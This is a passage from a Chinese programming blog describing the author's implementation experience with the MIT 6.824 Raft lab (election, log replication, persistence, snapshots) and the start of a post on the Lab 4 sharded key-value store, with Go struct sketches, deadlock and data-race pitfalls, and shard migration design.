<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">Snapshot</span><span class="params">(index <span class="keyword">int</span>, snapshot []<span class="keyword">byte</span>)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// truncate rf.logs</span></span><br><span class="line">    rf.lastIncludedIndex = index</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这个过程中涉及到读写共享变量，也是加锁的，没有问题。</p>
<p>如果这么写的话，问题就来了，在 2D 里就会发现一个节点日志提交的好好的，突然就没信了，到最后只剩下一个节点在打印日志。加一些调试日志后会发现，出现了死锁，问题的根源在于测试的这一段代码（精简了部分逻辑）：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(cfg *config)</span> <span class="title">applierSnap</span><span class="params">(i <span class="keyword">int</span>, applyCh <span class="keyword">chan</span> ApplyMsg)</span></span> {</span><br><span class="line">	cfg.mu.Lock()</span><br><span class="line">	rf := cfg.rafts[i]</span><br><span class="line">	cfg.mu.Unlock()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> m := <span class="keyword">range</span> applyCh {</span><br><span class="line">		<span class="keyword">if</span> m.SnapshotValid {</span><br><span class="line">			cfg.mu.Lock()</span><br><span class="line">			err_msg = cfg.ingestSnap(i, m.Snapshot, m.SnapshotIndex)</span><br><span class="line">			cfg.mu.Unlock()</span><br><span class="line">		} <span class="keyword">else</span> <span class="keyword">if</span> m.CommandValid {</span><br><span class="line">			<span class="keyword">if</span> m.CommandIndex != cfg.lastApplied[i]+<span class="number">1</span> {</span><br><span class="line">				err_msg = fmt.Sprintf(<span class="string">"server %v apply out of order, expected index %v, got %v"</span>, i, cfg.lastApplied[i]+<span class="number">1</span>, m.CommandIndex)</span><br><span class="line">			}</span><br><span class="line">			<span class="keyword">if</span> (m.CommandIndex+<span class="number">1</span>)%SnapShotInterval == <span class="number">0</span> { <span class="comment">// 看这里！！！！</span></span><br><span class="line">				w := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">				<span class="comment">// ...</span></span><br><span class="line">				rf.Snapshot(m.CommandIndex, w.Bytes())</span><br><span class="line">			}</span><br><span class="line">		} </span><br><span class="line">	</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这里的 <code>applyCh</code> 即是应用层的 <code>channel</code>，raft 启动节点时，会启动一个线程执行这个函数，读取日志消息，根据类型进行处理。那么好，问题就来了。观察注释处，可以发现，<strong>生成快照和接收应用层消息，使用的是同一个 goroutine</strong>。当同步提交的过程中，如果触发了创建快照，就会<strong>停止接收 raft 日志，进而阻塞住同步提交</strong>。</p>
<p>不幸的是，同步提交线程持有了 raft 的锁，这使得创建快照的线程一直阻塞在这个锁上，<strong>进而陷入死锁</strong>。</p>
<p>粗暴一点解决，提交日志这个过程可以异步化。每次要提交时，先加锁读取状态，创建一个 goroutine 在后台提交，逻辑示意如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">AppendEntries</span><span class="params">(args *AppendEntriesRequest, reply *AppendEntriesReply)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="comment">// for log in toCommit</span></span><br><span class="line">        <span class="comment">// do</span></span><br><span class="line">        <span class="comment">// 	   rf.applyCh &lt;- log</span></span><br><span class="line">        <span class="comment">// done</span></span><br><span class="line">    }()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>看起来好像解决了问题，执行可能也不会出现问题，但是这段代码是有问题的。问题在于<strong>要多次提交时，无法严格保证顺序</strong>。如果有两个密集的 <code>AppendEntries</code> 到来，都要求提交日志，<strong>最后应用层收到的日志可能是交替的结果</strong>。在实验中，有要求心跳不能过于频繁，因此可能不会暴露出问题。</p>
<p>我认为正确的解决方法，是像我一样，将日志的 raft 提交和应用层提交区分开。<code>AppendEntries</code> 只改 <code>commitIndex</code>，后台线程发现 <code>commitIndex&gt;lastApplied</code>，去向应用层提交。由于提交到应用层这一过程，只在单线程里发生，可以严格保证顺序。</p>
<p>此外，这种方案还有一个优点，就是避免应用层接收故障影响 raft 层。对于 leader 来说，如果它也是同步提交到应用层，那么如果应用层的接受出现问题，就会阻塞 leaderHeartbeat 线程，使得 leader 无法服务。这也是有问题。改为异步后台线程后，raft 层就不会受到影响。</p>
<h2 id="a-leader-选举">2A leader 选举</h2>
<p>这个实验要求实现 leader 的选举相关逻辑，以及 leader 的心跳功能（抑制选举）。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> RequestVoteArgs <span class="keyword">struct</span> {</span><br><span class="line">	<span class="comment">// Your data here (2A, 2B).</span></span><br><span class="line">	Term         <span class="keyword">int</span> <span class="comment">// Candidate 的 Term ID</span></span><br><span class="line">	CandidateId  <span class="keyword">int</span> <span class="comment">// Candidate 的 ID</span></span><br><span class="line">	LastLogIndex <span class="keyword">int</span> <span class="comment">// Candidate 所持有的最后一条日志记录的 index</span></span><br><span class="line">	LastLogTerm  <span class="keyword">int</span> <span class="comment">// Candidate 所持有的最后一条日志记录的 Term ID</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// example RequestVote RPC reply structure.</span></span><br><span class="line"><span class="comment">// field names must start with capital letters!</span></span><br><span class="line"><span class="keyword">type</span> RequestVoteReply <span class="keyword">struct</span> {</span><br><span class="line">	<span class="comment">// Your data here (2A).</span></span><br><span class="line">	Term        <span class="keyword">int</span>  <span class="comment">// 接收方的 Term ID</span></span><br><span class="line">	VoteGranted <span class="keyword">bool</span> <span class="comment">// 接收方是否同意给出选票</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>处理流程如 raft 论文里描述的，</p>
<blockquote>
<p>接收方在接收到该 RPC 后会进行以下操作：</p>
<ol type="1">
<li>若 <code>term &lt; currentTerm</code>，返回 <code>false</code></li>
<li>若 <code>votedFor == null</code>
且给定的日志记录信息可得出对方的日志和自己的相同甚至更新，返回
<code>true</code></li>
</ol>
</blockquote>
<p>注意，这里的<code>日志和自己的相同甚至更新</code>，是通过最后一条日志的任期和索引判断的，也就是 <code>LastLogTerm</code> 和 <code>LastLogIndex</code>。逻辑是，先判断任期大的更新，任期相同，则日志索引大的更新。</p>
<p>还需要注意的是，下面这条规则是通用的，<strong>优先级最高</strong>的。</p>
<blockquote>
<p>对于所有节点：</p>
<ul>
<li>若 RPC 请求或相应内容中携带的 <code>term &gt;
currentTerm</code>，则令 <code>currentTerm = term</code>，且 Leader
降级为 Follower</li>
</ul>
</blockquote>
<p>更详细一点描述，对于请求的 <code>term</code>：</p>
<ul>
<li>如果 <code>term &gt;
currentTerm</code>，说明自身的任期落后，需要追上令 <code>currentTerm =
term</code>，且 Leader 降级为
Follower，且将 <code>voteFor</code> 置空。因为在任期改变后，投票、角色信息都要清空</li>
<li>如果 <code>term&lt;currentTerm</code>，说明请求是过时的节点发出的，不予处理，并<strong>将自己的 <code>currentTerm</code> 写在响应中，让对方意识到自己落后了</strong>。</li>
</ul>
<p>建议抽为一个函数，集中处理这块的逻辑。</p>
<p>2A 整体还比较简单，没有太大的坑。</p>
<h2 id="b-日志">2B 日志</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> AppendEntriesRequest <span class="keyword">struct</span> {</span><br><span class="line">	Term         <span class="keyword">int</span>        <span class="comment">//Leader 的 Term ID</span></span><br><span class="line">	LeaderId     <span class="keyword">int</span>        <span class="comment">// Leader 的 ID</span></span><br><span class="line">	PrevLogIndex <span class="keyword">int</span>        <span class="comment">// 在正在备份的日志记录之前的日志记录的 index 值</span></span><br><span class="line">	PrevLogTerm  <span class="keyword">int</span>        <span class="comment">// 在正在备份的日志记录之前的日志记录的 Term ID</span></span><br><span class="line">	Entries      []LogEntry <span class="comment">// 正在备份的日志记录</span></span><br><span class="line">	LeaderCommit <span class="keyword">int</span>        <span class="comment">// Leader 已经提交的最后一条日志记录的 index 值</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AppendEntriesReply <span class="keyword">struct</span> {</span><br><span class="line">	Term    <span class="keyword">int</span>  <span class="comment">// 接收方的当前 Term ID</span></span><br><span class="line">	Success <span class="keyword">bool</span> <span class="comment">// 当 Follower 能够在自己的日志中找到 index 值和 Term ID 与 prevLogIndex 和 prevLogTerm 相同的记录时为 true</span></span><br><span class="line">	XTerm   <span class="keyword">int</span>  <span class="comment">// term in the conflicting entry (if any)</span></span><br><span class="line">	XIndex  <span class="keyword">int</span>  <span class="comment">// index of first entry with that term (if any)</span></span><br><span class="line">	XLen    <span class="keyword">int</span>  <span class="comment">// log length</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>处理流程如 raft 论文里描述的：</p>
<blockquote>
<p>接收方在接收到该 RPC 后会进行以下操作：</p>
<ol type="1">
<li>若 <code>term &lt; currentTerm</code>，返回 <code>false</code></li>
<li>若日志中不包含 index 值和 Term ID 与 <code>prevLogIndex</code> 和
<code>prevLogTerm</code> 相同的记录，返回 <code>false</code></li>
<li><strong>如果日志中存在与正在备份的日志记录相冲突的记录</strong>（有相同的
index 值但 Term ID 不同），删除该记录以及之后的所有记录</li>
<li>在保存的日志后追加新的日志记录</li>
<li>若 <code>leaderCommit &gt; commitIndex</code>，令
<code>commitIndex</code> 等于 <code>leaderCommit</code>
和最后一个新日志记录的 index 值之间的最小值</li>
</ol>
</blockquote>
<p>这里有一个坑是加粗的地方，只有在<strong>有冲突</strong>的情况下，才会对 follower 的节点进行截断处理。这里的冲突时指有相同的
index 值但 Term ID
不同，而不是 <code>command</code> 的值不同，注意，<strong>任何时候不能用 <code>command</code> 的值去做判断逻辑</strong>。Raft 本身对应用层应该是一无所知的。</p>
<p>最开始的话，容易想当然，如果前一个节点是匹配的，我直接把当前节点后面的都丢掉，全盘接收 leader 传过来的日志不就行了，为什么还要去判断冲突呢？原因是，follower 可能收到过期的 <code>AppendEntries</code> 请求，直接截断可能会导致丢弃掉部分日志，例如 follower 已经告诉 leader 自己成功接收的，就会出现问题。</p>
<p>这里还可能出现的问题是，data race。如果开了 <code>-race</code>
flag，就会发现有时候会在 <code>AppendEntries</code> 处理过程中报 race，明明已经加了锁了。代码示例可能如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">AppendEntries</span><span class="params">(args *AppendEntriesRequest, reply *AppendEntriesReply)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    rf.logs=<span class="built_in">append</span>(rf.logs[:x], args.Entries...) <span class="comment">// race</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这是由于，在 go 中，切片的截断操作是复用底层数据的。Entries、logs 的切片截断，都会间接持有 logs 的引用，进而在某些区域出现读写 race 问题。解决方法是把 log 复制到别的地方，再做截断。</p>
<p>还有一个点，论文里的描述会晦涩一点：</p>
<blockquote>
<p>对于 Leader：</p>
<p>如果存在一个值 <code>N</code>，使得 <code>N &gt;
commitIndex</code>，且大多数的 <code>matchIndex[i] &gt;= N</code>，且
<code>log[N].term == currentTerm</code>，令 <code>commitIndex =
N</code></p>
</blockquote>
<p>这个说的是，如果 leader 发现，超半数以上的节点都接收到了 N 索引以上的日志，且 N 日志是在当前任期产生的，那么就对 N 之前的日志进行提交。具体实现上，可以将 <code>matchIndex</code> 排序，取中值即可。</p>
<h2 id="c-持久化">2C 持久化</h2>
<p>正如论文里描述的，持久化的信息有三种</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">currentTerm       <span class="keyword">int</span>        <span class="comment">// 当前 Term ID（初值为 0）</span></span><br><span class="line">votedFor          <span class="keyword">int</span>        <span class="comment">// 该 Term 中已接收到来自该节点的选票的 Candidate ID</span></span><br><span class="line">logs              []LogEntry <span class="comment">// 日志记录。第一个日志记录的 index 值为 1</span></span><br></pre></td></tr></tbody></table></figure>
<p>这个比较明确，接下来需要思考的是，什么时候持久化。</p>
<p>思考后不难想出，在这些变量发生变化之后，都需要持久化。其实再进一步思考，可以发现，<strong>raft 节点的变化，只有被其他节点感知到，才是有效的</strong>。换而言之，如果一个 raft 节点内部一直在变化状态，但是由于网络问题，这些状态无法传给其他节点，那么也无需保存了。再进一步，raft 间感知状态只有通过 rpc 调用这一种方式，因此可以在处理 rpc 的逻辑之后，进行持久化。</p>
<p>容易疏忽的是，在 leader 提交日志后，也需要持久化，这里相当于其他节点的 <code>AppendEntries</code> 了，需要对等处理。</p>
<p>日志的快恢复算法可以参考老师上课的讲义，描述的比较清楚了已经。</p>
<h2 id="d-日志快照">2D 日志快照</h2>
<p>日志快照本身的思想很简单，但是实现逻辑却相当复杂。首先要思考一个问题，快照的 <code>lastIncludedTerm/lastIncludedIndex</code> 需要持久化嘛？</p>
<p>答案是要的，考虑特殊情况，如果一个节点内的所有日志都存到了快照里，本地一个日志都没有了。这个时候，来了一个投票请求，这个节点要怎么决定是否同意呢？也可以反过来，如果这个节点要开启一轮选举，<strong>怎么得到它的日志进度呢</strong>？</p>
<p>因此，持久化这些信息是有必要的。这个实验最复杂的逻辑是：日志索引和 logs 位置的映射，日志找不到怎么处理。这一部分改起来会比较痛苦，如果前面没有预留一些设计空间的话，就需要重构。剩下还有一些历史逻辑，比如和持久化、快恢复的搭配，也需要思考清楚。</p>
<h2 id="一些建议">一些建议</h2>
<p>下面是我个人对于这个 lab 的一些建议，实在一点：</p>
<ol type="1">
<li>绝对、绝对不要<strong>持有锁做任何可能阻塞的事情</strong>，包括不限于 RPC、channel 操作等。死锁往往就是这么发生的。</li>
<li><strong>将需要加锁和不需要加锁的函数分开命名</strong>，例如 <code>getMaxLogIndexWithLock</code>，<code>getMaxLogIndexWithoutLock</code>。这是由于 go 的锁不支持重入，反复加锁也会死锁。分开命名可以提醒自己在不同的情况，调不同的函数。</li>
<li><strong>最小化加锁逻辑</strong>。加锁仅限于共享变量的读写，读写完毕后即可释放。Raft 的正确性可以通过任期保证过期数据不会产生恶劣影响，无需担心。</li>
<li>多用 <code>DPrintf</code>，只有日志是你唯一的依靠（，建议用 nohup 把日志放在文件里，方便分析</li>
</ol>
<p>最后做完这个 lab，能百余次通过测试，还是很有成就感的。希望本篇可以帮到大家！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://mr-dai.github.io/raft/#日志压缩">Raft 总结 - Robert
Peng's Blog (mr-dai.github.io)</a></li>
<li><a href="https://thesquareplanet.com/blog/students-guide-to-raft/">Students'
Guide to Raft :: Jon Gjengset (thesquareplanet.com)</a></li>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/lecture-06-raft1/6.2-guo-ban-piao-jue-majority-vote">6.2
过半票决（Majority Vote） - MIT6.824 (gitbook.io)</a></li>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/lecture-06-raft1/6.5-ri-zhi-raft-log">6.5
日志（Raft Log） - MIT6.824 (gitbook.io)</a></li>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/lecture-07-raft2/7.5-ri-zhi-kuai-zhao-log-snapshot">7.5
日志快照（Log Snapshot） - MIT6.824 (gitbook.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>MIT 6.824</tag>
        <tag>分布式系统</tag>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT-6.824 Lab4: 切片 KV 数据库</title>
    <url>/blog/2023/08/11/MIT-6-824-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT
6.824 实验课程的最后一篇，实现一个高可用的、分片的 KV 数据库。分片能够有效解决单节点能承载的并发量问题，成倍地提升读写并发，但需要处理配置更新、切片迁移、删除等问题。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="整体架构">整体架构</h2>
<p>下面是 ShardKV 的架构图，图片来源（<a href="https://zhuanlan.zhihu.com/p/464097239">mit-6.824 2021
Lab4：ShardKV - 知乎 (zhihu.com)</a>）。</p>
<p><img src="architecture.webp"></p>
<h3 id="shardctrler">ShardCtrler</h3>
<p>基于 Raft 构建的切片配置服务，client 可以通过 Join/Leave/Move/Query 四个 rpc，增查配置。默认有 10 个切片，根据 hash 取模得到 key 对应的切片。每个 config 由两部分组成，切片映射和多个复制组。每个复制组存储了一个切片子集的数据（一个切片的数据只会存储在一个复制组内），内部使用 Raft 实现高可用。切片映射用于将切片映射到复制组。从代码角度看，<code>Config</code> 结构体内包含：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> {</span><br><span class="line">	Num    <span class="keyword">int</span>              <span class="comment">// config number</span></span><br><span class="line">	Shards [NShards]<span class="keyword">int</span>     <span class="comment">// shard -&gt; gid, shards[0]=1 表示 切片 0 的数据在 group 1 上</span></span><br><span class="line">	Groups <span class="keyword">map</span>[<span class="keyword">int</span>][]<span class="keyword">string</span> <span class="comment">// gid -&gt; servers[]</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>Num：自增的配置编号</li>
<li> Shards：shard 和 gid 的对应关系，将切片映射到复制组</li>
<li> Groups：每个复制组拥有的 kv server</li>
</ul>
<h3 id="shardkv">ShardKV</h3>
<p>KV 存储的服务端，存储若干个切片的 KV 数据。需要周期性检测配置更新，进行配置更新、分片数据迁移、清理等工作。</p>
<p>客户端会依据最新的 shard 配置，发起 PUT/GET/APPEND 请求到 key 对应的服务端。</p>
<h2 id="思考">思考</h2>
<p>在盲目写代码之前，应该先理解背景和问题，思考需要做哪些事情、怎么做。</p>
<h3 id="shardctrler-的操作含义">ShardCtrler 的操作含义</h3>
<p><strong>复制组（Replica
Group）是指一组用于 ShardKV 服务的，内部互为复制关系的服务器</strong>。刚开始看到这个词可能会觉得有点表意不清。一个复制组内可能会持有一个或多个切片的数据。ShardCtrler
向 client 暴露 4 种 rpc：</p>
<ul>
<li>Join：增加一个复制组用于 ShardKV 服务，即我们常说的扩容，需要进行<strong>负载均衡</strong></li>
<li> Leave：移除一个 ShardKV 复制组，即我们常说的缩容，需要进行<strong>负载均衡</strong></li>
<li> Move：将一个切片的数据移动到另一个复制组，这个主要是方便测试用的</li>
<li> Query：查询某个版本的配置状态</li>
</ul>
<p>前三种修改配置的操作，实际上是新增了一个配置。上面提到的负载均衡是指，<strong>将切片均匀地分散到复制组上，并尽可能少地转移数据</strong>。如何实现呢，其实也容易，每次让拥有最多分片的复制组，分一个给拥有最少分片的复制组，直到两者的分片数量差 &lt;=1 即可。</p>
<p>这里需要处理一些边界情况。例如初始时，所有切片都是在默认的无效组 0 上，新来一个复制组，就应该把所有切片都分给它，而不该把 0 当成一个有效的组，给它分 5 个。</p>
<h3 id="shardkv-配置更新意味着什么">ShardKV 配置更新意味着什么</h3>
<p>每次配置变动后，一个复制组可能会失去某些切片，获得一些切片，进而需要：</p>
<ul>
<li>新获得的切片：获取对应的切片数据</li>
<li>失去的切片：当新的复制组受理数据后，将切片数据删除</li>
</ul>
<h3 id="shardkv-由谁负责配置更新">ShardKV 由谁负责配置更新</h3>
<p>在一个复制组内，多个节点要利用 Raft 保证线性一致性。如果配置更新各自独立完成，一致性就会被打破，出现问题。因此，还是要利用 Raft，由 leader 节点发起配置更新并逐步地完成，follower 只需要被动提交日志即可。</p>
<h3 id="shardkv-检测配置更新流程">ShardKV 检测配置更新流程</h3>
<p>在 leader 侧，有一个后台线程，隔一段时间，例如 50-100ms 检查配置更新，这一点是毋庸置疑的。问题是检查哪个配置，最新的配置吗？</p>
<p>不不不，不可以。检查最新的配置可能会出现配置突变的情况，假设，目前的 config1，shard1 在 g100 上，发生了如下事情：</p>
<ol type="1">
<li>client 提交了 config2，shard1 被分给 g101</li>
<li>g101 获取到了 config2，<strong>希望从 g100 获得 shard1</strong></li>
<li>client 提交了 config3，shard1 又被分给了 g100</li>
<li>g100 获取到了 config3，<strong>觉得自己什么都不用做</strong></li>
</ol>
<p>这就出现了不一致的问题。因此正确答案是，<strong>复制组需要保存当前的配置，每次检查是否存在下一个版本的配置，进行更新</strong>。这样可以保证所有的节点按同样的顺序更新配置。</p>
<p>另一个问题是，leader 一次能够处理几个配置更新？这个也显然是 1 个，当 leader 处在配置更新中时，应该暂停检测更新。换而言之，检测到配置更新后，应该阻塞到配置更新完毕，再继续检测。</p>
<h3 id="shardkv-怎么进行切片转移">ShardKV 怎么进行切片转移</h3>
<p>常规来看，数据转移有两种模式：</p>
<ul>
<li>一种是拉（PULL），每个复制组去主动拉取自己需要的数组</li>
<li>一种是推（PUSH），每个复制组将其他复制组需要的切片数据推送给它们</li>
</ul>
<p>我个人认为拉的模式更好。考虑扩容的场景，新的复制组没有任何数据和用户请求，由它来主导发起数据请求，其他复制组被动回应，再好不过了。</p>
<h3 id="shardkv-拉取数据">ShardKV 拉取数据</h3>
<p>需要拉取哪些数据？基础的 KV 映射是必须的，但是还不够，还需要把请求的去重表也进行同步，否则，在收到历史消息后，可能会有重复执行的问题。</p>
<p>拉取数据时，配置不一致怎么办？不可以直接拉取，需要等到配置一致了才可以进行，否则会有问题。考虑下面的场景：</p>
<ol type="1">
<li>config1 时 x=1 在 g100</li>
<li> 发布 config2，x 在 g101</li>
<li>g101 检测到 config2，向 g100 拉取 x</li>
<li>g100 返回 x=1</li>
<li>g100 收到历史消息，<code>put x
2</code>，发现自己不在配置更新中，处理</li>
</ol>
<p>究其原因，配置不一致时，不同复制组对切片数据的行为可能是冲突的，使得历史消息的执行出现问题。</p>
<h3 id="shardkv-何时删除切片数据">ShardKV 何时删除切片数据</h3>
<p>正如之前讨论的，当新的复制组受理数据后，原复制组可以将可以将多的一部分数据删除。受理需要等待新的复制组 commit 数据，原来的数据才是彻底没用了，否则，可能由于节点下线等，需要重新请求、</p>
<p>因此，可以使用类似回调的模式，当新的复制组受理数据后，通知原复制组对原有数据进行删除。</p>
<h3 id="shardkv-新增的操作类型">ShardKV 新增的操作类型</h3>
<p>除了基础的 GET/PUT/APPEND，为了支持配置更新、切片迁移等的同步一致，需要设计新的操作，可以分为以下几类：</p>
<ul>
<li>配置更新开始的操作，通知整个复制组开始进行配置更新。复制组内必须对配置更新达成共识，这样 leader 下线后，其他节点才能继续更新工作。</li>
<li>切片数据的增删操作，当 leader 收到增删切片数据后，通知整个复制组。</li>
<li>配置更新的结束操作，通知复制组配置更新完成。</li>
</ul>
<p>这几步基本都是必须的，要考虑 leader 下线 / 其他节点成为 leader 的变动下，配置更新的状态不会丢失，必须把相关的操作使用 Raft 同步。</p>
<h3 id="shardkv-配置更新流程">ShardKV 配置更新流程</h3>
<ol type="1">
<li>后台线程检测到新配置，提交到 Raft，等待更新完成</li>
<li> server apply
新配置，<strong>将 server 标识为配置更新中</strong>，开启新的异步线程 t1 用以处理</li>
<li> t1 计算需要 pull 的切片，并发获取</li>
<li> t1 获取到的切片数据，提交给 Raft</li>
<li>t1 等到某个切片数据新增的操作 apply 后，发起删除数据的 rpc</li>
<li>t1 等到所有数据删除成功后</li>
<li> t1 将配置更新结束提交到 raft，等待执行</li>
<li> server apply
结束操作，<strong>将 server 标识为配置更新结束</strong></li>
</ol>
<p>在上述过程中，新的配置从 2 开始生效，server 开始根据最新的配置拒绝 <code>ErrWrongGroup</code> 的请求，对于 group 正确，但处在迁移中的数据，需要等到 8 之后才能受理，这时候可以返回给 client 一个等待信号，例如 <code>ErrWait</code>，让客户端等一会儿再重试，避免大量线程阻塞在 server 端。</p>
<p>在 challenge 里面，需要我们在 5 之后就开始处理对应切片的请求，达到快速响应的效果。</p>
<h3 id="删除切片数据是同步还是异步">删除切片数据是同步还是异步</h3>
<p>当然，同步是最好写的。但是同步会阻塞后续请求，不优雅。异步的话，<strong>需要重新设计</strong>，否则只有一个 <code>map[string]string</code> 作为数据库的情况下，异步也得加锁、找到切片对应的 <code>key</code>，删除，解锁，跟同步没有什么区别。</p>
<p>如果要异步的话，建议搞一个 <code>[]map[string]string</code>，slice 位置存对应 shard 的数据，要删除的时候，直接锁对应的 shard，删除即可。甚至也可以直接把 slice 对应位置设成 <code>nil</code>，等 go 的垃圾回收线程去回收，更优雅（笑</p>
<h2 id="operation">Operation</h2>
<p>GET/PUT/APPEND 就不说了</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ConfigureOp <span class="keyword">struct</span> {</span><br><span class="line">	Config shardctrler.Config</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	INSERT = <span class="number">1</span></span><br><span class="line">	DELETE = <span class="number">2</span></span><br><span class="line">	END    = <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ShardOp <span class="keyword">struct</span> {</span><br><span class="line">	Type      <span class="keyword">int8</span></span><br><span class="line">	Shard     <span class="keyword">int</span></span><br><span class="line">	ConfigNum <span class="keyword">int</span></span><br><span class="line">	Data      <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">	Seen      <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int64</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>ConfigureOp</code>：开始配置更新</li>
<li><code>ShardOp</code>：切片数据的 Insert、Delete 操作，简便起见把标识更新结束的 End 也加进来了</li>
</ul>
<h2 id="server">server</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ShardKV <span class="keyword">struct</span> {</span><br><span class="line">	deadlock.Mutex</span><br><span class="line">	me           <span class="keyword">int</span></span><br><span class="line">	rf           *raft.Raft</span><br><span class="line">	applyCh      <span class="keyword">chan</span> raft.ApplyMsg</span><br><span class="line">	make_end     <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>)</span> *<span class="title">labrpc</span>.<span class="title">ClientEnd</span></span></span><br><span class="line">	gid          <span class="keyword">int</span></span><br><span class="line">	ctrlers      []*labrpc.ClientEnd</span><br><span class="line">	maxraftstate <span class="keyword">int</span> <span class="comment">// snapshot if log grows this big</span></span><br><span class="line"></span><br><span class="line">	dead <span class="keyword">int32</span> <span class="comment">// set by Kill()</span></span><br><span class="line">	<span class="comment">// Your definitions here.</span></span><br><span class="line">	id <span class="keyword">string</span></span><br><span class="line">	<span class="comment">// 切片</span></span><br><span class="line">	mck           *shardctrler.Clerk</span><br><span class="line">	prevConfig    shardctrler.Config</span><br><span class="line">	currentConfig shardctrler.Config</span><br><span class="line">	deleteCond    *deadlock.Cond</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	db   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">	seen <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int64</span></span><br><span class="line">	<span class="comment">// 维护提交状态</span></span><br><span class="line">	lastApplied <span class="keyword">int</span></span><br><span class="line">	applyCond   *deadlock.Cond</span><br><span class="line">	<span class="comment">// persistence</span></span><br><span class="line">	persister   *raft.Persister</span><br><span class="line">	maxRaftSize <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// lab 4b 挑战, 准确地记录正在迁移中的切片, 即本该有的, 但还没获取到</span></span><br><span class="line">	inMigration <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">bool</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>基于之前的讨论，可以设计出这样的结构体。server 需要记录最新的 config 和上一个 config，并持久化到快照里，用于重启后知晓自己是否处在配置更新中。这里用指针其实更合适一点，配置更新中等价于 <code>prevConfig!=nil</code>，但是 gob 不能处理空指针的序列化，就很坏。</p>
<p>有了两个 config 之后，要怎么使用呢：</p>
<ul>
<li>配置更新开始时，设置 <code>prevConfig=currentConfig ;
currentConfig=op.Config</code></li>
<li>更新完毕后，设置 <code>prevConfig.Num=0</code>，配置更新中 &lt;=&gt;<code>prevConfig.Num!=0</code></li>
<li>根据 <code>prevConfig.Shards</code> 和 <code>currentConfig.Shards</code>，计算需要拉取、删除的 shard</li>
<li> 拉取删除数据时，要依赖 <code>prevConfig.Groups</code> 找到对应的 <code>endname</code> 发起请求</li>
<li>当成功删除某个 shard 后，更新 <code>prevConfig.Shards[shard]=currentConfig.Shards[shard]</code>，唤醒更新线程，再次检查是否存在需要等待删除的 shard</li>
</ul>
<p>注意，<strong>在插入 shard 数据后，不能更新 config</strong>！！！不然会有重启后，切片数据删除不掉的问题，假设存在下面的配置更新：</p>
<ul>
<li>[100,100]-&gt;[101,101]</li>
<li>101 拿到并 apply 切片 0,1 之后，发起删除切片之前，宕机了</li>
<li> 101 新选举出 leader 后，发现自己没有需要拉取的数据了（因为 config 已经更新过了），也没有需要删除的数据，直接更新结束了</li>
